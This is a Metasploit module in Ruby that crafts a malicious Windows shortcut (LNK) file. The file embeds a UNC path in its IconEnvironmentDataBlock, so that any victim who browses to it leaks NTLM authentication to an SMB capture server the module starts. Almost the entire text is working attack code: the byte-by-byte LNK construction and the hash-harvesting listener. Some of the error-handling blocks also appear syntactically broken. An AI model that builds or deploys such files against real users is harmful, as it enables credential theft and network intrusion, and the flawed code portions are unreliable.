##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
    Rank = GoodRanking
  
    include Msf::Exploit::FILEFORMAT
    include Msf::Exploit::Remote::SMB::Server::Share
    include Msf::Exploit::Remote::SMB::Server::HashCapture
    
    def initialize(info = {})
      super(update_info(info,
        'Name'           => 'IconEnvironmentDataBlock - Windows LNK File Special UNC Path NTLM Leak',
        'Description'    => %q{
          This module creates a malicious Windows shortcut (LNK) file that
          specifies a special UNC path in IconEnvironmentDataBlock of Shell Link (.LNK) 
          that can trigger an authentication attempt to a remote server. This can be used 
          to harvest NTLM authentication credentials.
  
          When a victim browse to the location of the LNK file, it will attempt to 
          connect to the the specified UNC path, resulting in an SMB connection that 
          can be captured to harvest credentials.
        },
        'License'        => MSF_LICENSE,
        'Author'         => [
          'Nafiez', # Original POC & MSF Module
        ],
        'References'     => [
          ['URL', 'https://zeifan.my/Right-Click-LNK/']
        ],
        'Platform'       => 'win',
        'Targets'        => [
          ['Windows', {}]
        ],
        'DefaultTarget'  => 0,
        'DisclosureDate' => '2025-05-16',
        'Notes'          => {
          'Stability'    => [CRASH_SAFE],
          'SideEffects'  => [IOC_IN_LOGS],
          'Reliability'  => [REPEATABLE_SESSION]
        }
      ))
  
      register_options([
        OptString.new('FILENAME', [true, 'The LNK file name', 'msf.lnk']),
        OptString.new('UNC_PATH', [false, 'The UNC path for credentials capture (e.g., \\\\192.168.1.1\\share)', nil]),
        OptString.new('DESCRIPTION', [false, 'The shortcut description', nil]),
        OptString.new('ICON_PATH', [false, 'The icon path to use (not necessary using real ICON)', nil]),
        OptInt.new('PADDING_SIZE', [false, 'Size of padding in command arguments', 10])
      ])
      deregister_options('SRVHOST', 'SRVPORT')
      register_advanced_options([
        OptAddressLocal.new('SRVHOST', [true, 'The local host to listen on', '0.0.0.0']),
        OptPort.new('SRVPORT', [true, 'The local port to listen on', 445])
      ])
    end
  
    def run
      print_status("Creating '#{datastore['FILENAME']}' file...")

      description = datastore['DESCRIPTION']
      icon_path = datastore['ICON_PATH']

      unless description && !description.empty?
        require 'faker'
        description = Faker::Lorem.sentence(word_count: 3) rescue nil
        rescue LoadError
          description = nil
        end
        description ||= 'Shortcut'
      end

      unless icon_path && !icon_path.empty?
        require 'faker'
        icon_path = File.join('%SystemRoot%\\System32', "#{Faker::File.file_name(ext: 'ico')}") rescue nil
        rescue LoadError
          icon_path = nil
        end
        icon_path ||= '%SystemRoot%\\System32\\shell32.dll'
      end

      unc_path = datastore['UNC_PATH']
      if unc_path.nil? || unc_path.empty?
        start_smb_capture_server
        unc_path = "\\\\#{datastore['SRVHOST']}\\#{random_share_name}"
      else
        validate_or_fail_unc!(unc_path)
      end

      @resolved_description = description
      @resolved_icon_path = icon_path
      @resovled_unc_path = unc_path
      lnk_data = create_lnk_file
      file_create(lnk_data)
      print_good("LNK file created: #{datastore['FILENAME']}")
      print_status("Listening for hashes on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}")

    end
  
    def create_lnk_file
      begin
        data = "".b
        
        # LNK header - 76 bytes
        header = "\x4C\x00\x00\x00".b
        
        # LinkCLSID (00021401-0000-0000-C000-000000000046)
        header += "\x01\x14\x02\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46".b
        
        # Define LinkFlags
        link_flags = 0x00000000
        link_flags |= 0x00000004  # HAS_NAME
        link_flags |= 0x00000020  # HAS_ARGUMENTS
        link_flags |= 0x00000040  # HAS_ICON_LOCATION
        link_flags |= 0x00000080  # IS_UNICODE
        link_flags |= 0x00004000  # HAS_EXP_ICON
        
        header += [link_flags].pack('V')
        
        # FileAttributes (FILE_ATTRIBUTE_NORMAL)
        header += "\x20\x00\x00\x00".b
        
        # CreationTime, AccessTime, WriteTime (zeroed)
        header += ("\x00\x00\x00\x00\x00\x00\x00\x00".b) * 3
        
        # FileSize
        header += "\x00\x00\x00\x00".b
        
        # IconIndex
        header += "\x00\x00\x00\x00".b
        
        # ShowCommand (SW_SHOWNORMAL)
        header += "\x01\x00\x00\x00".b
        
        # HotKey
        header += "\x00\x00".b
        
        # Reserved fields
        header += "\x00\x00".b + "\x00\x00\x00\x00".b + "\x00\x00\x00\x00".b
        
        # Add the header to our binary data
        data += header
              
        # NAME field (description in Unicode)
        description = @resolved_description.to_s
        description_utf16 = description.encode('UTF-16LE').b
        data += [description_utf16.bytesize / 2].pack('v')
        data += description_utf16
        
        # ARGUMENTS field (command line arguments in Unicode)
        padding_size = datastore['PADDING_SIZE']
        cmd_args = " " * padding_size
        cmd_args_utf16 = cmd_args.encode('UTF-16LE').b 
        data += [cmd_args_utf16.bytesize / 2].pack('v')
        data += cmd_args_utf16
        
        # ICON LOCATION field (icon path in Unicode)
        icon_path = @resolved_icon_path.to_s
        icon_path_utf16 = icon_path.encode('UTF-16LE').b
        data += [icon_path_utf16.bytesize / 2].pack('v')
        data += icon_path_utf16
        
        # ExtraData section - ICON ENVIRONMENT DATABLOCK SIGNATURE
        env_block_size = 0x00000314  # Total size of this block
        env_block_sig = 0xA0000007   # ICON_ENVIRONMENT_DATABLOCK_SIGNATURE
        
        data += [env_block_size].pack('V')
        data += [env_block_sig].pack('V')
        
        # Target field in ANSI (260 bytes)
        unc_path = @resovled_unc_path.to_s
        
        # Create fixed-size ANSI buffer with nulls
        ansi_buffer = "\x00".b * 260
        
        # Copy the UNC path bytes into the buffer
        unc_path.bytes.each_with_index do |byte, i|
          ansi_buffer.setbyte(i, byte) if i < ansi_buffer.bytesize
        end
        
        data += ansi_buffer
        
        # Target field in Unicode (520 bytes)
        unc_path_utf16 = unc_path.encode('UTF-16LE').b
        
        # Create fixed-size Unicode buffer with nulls
        unicode_buffer = "\x00".b * 520
        
        # Copy the UTF-16LE encoded UNC path bytes into the buffer
        unc_path_utf16.bytes.each_with_index do |byte, i|
          unicode_buffer.setbyte(i, byte) if i < unicode_buffer.bytesize
        end
        
        data += unicode_buffer
        
        data += "\x00\x00\x00\x00".b
        
        data
      rescue => e
        print_error("Error in create_lnk_file: #{e.message}")
        print_error("#{e.backtrace.join("\n")}")
        raise e
      end
    end
    
    def start_smb_capture_server
      self.share_name = random_share_name
      self.smb_srvhost = datastore['SRVHOST']
      self.smb_srvport = datastore['SRVPORT']
      self.capture_hashes = true
      start_service
    end

    def random_share_name
      "share#{Rex::Text.rand_text_alphanumeric(6)}"
    end
    
    def validate_or_fail_unc!(path)
      unless path.match(/^\\\\[^\\]+\\[^\\]+$/)
        fail_with(Failure::BadConfig, "UNC_PATH format invalid, expected \\\\server\\share")
      end
    end
  end 